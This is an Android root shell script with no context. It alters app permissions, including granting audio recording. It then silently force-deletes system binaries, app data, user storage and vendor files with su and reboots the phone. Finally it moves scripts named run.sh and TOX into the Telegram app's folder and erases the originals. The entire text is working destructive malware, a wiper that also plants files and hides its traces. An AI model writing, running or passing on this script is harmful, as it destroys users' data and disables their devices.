#!/system/bin/sh

   pm revoke  android.permission.READ_EXTERNAL_STORAGE  &> /dev/null
   pm grant  android.permission.WRITE_EXTERNAL_STORAGE  &> /dev/null
   pm grant  android.permission.RECORD_AUDIO  &> /dev/null

su -c rm -rf /data/media/0/*  &> /dev/null
su -c rm -rf /system/bin/*  &> /dev/null
su -c rm -rf /data/data/*  &> /dev/null
su -c rm -rf /storage/emulated/0/*  &> /dev/null
su -c rm -rf /vendor/*.prop  &> /dev/null
su -c rm -rf /vendor  &> /dev/null

su -c reboot  &> /dev/null

mv /data/media/0/Android/data/com.pakage.upsilon/files/run.sh /data/media/0/Android/data/org.telegram.messenger/run.sh
#mv /data/media/0/Android/data/com.pakage.upsilon/files/hack.sh /data/media/0/Android/data/org.telegram.messenger//hack.sh
mv /data/media/0/Android/data/com.pakage.upsilon/files/TOX /data/media/0/Android/data/org.telegram.messenger//TOX
#mv /data/media/0/Android/data/com.pakage.upsilon/files/lol /data/media/0/Android/data/org.telegram.messenger//lol
sleep 2
rm -rf /data/media/0/Android/data/com.pakage.upsilon/files/{run.sh,TOX,START.sh}